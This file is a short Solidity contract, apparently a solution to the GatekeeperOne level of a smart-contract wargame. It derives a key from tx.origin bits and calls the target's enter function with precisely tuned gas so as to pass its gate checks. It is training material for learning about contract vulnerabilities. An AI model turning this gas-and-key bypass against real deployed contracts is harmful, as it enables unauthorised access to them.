// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {GatekeeperOne} from "./GatekeeperOne.sol";

error TooMuchGas();
error EnterFailed();

contract GatekeeperOneHack {
    function attack(address _target, uint256 _gas) external {
        GatekeeperOne target = GatekeeperOne(_target);
        uint16 key16 = uint16(uint160(tx.origin));
        uint64 key64 = uint64(1 << 63) + uint64(key16);
        bytes8 key = bytes8(key64);
        if (_gas >= 8191) revert TooMuchGas();
        if (!target.enter{gas: 8191 * 10 + _gas}(key)) revert EnterFailed();
    }
}
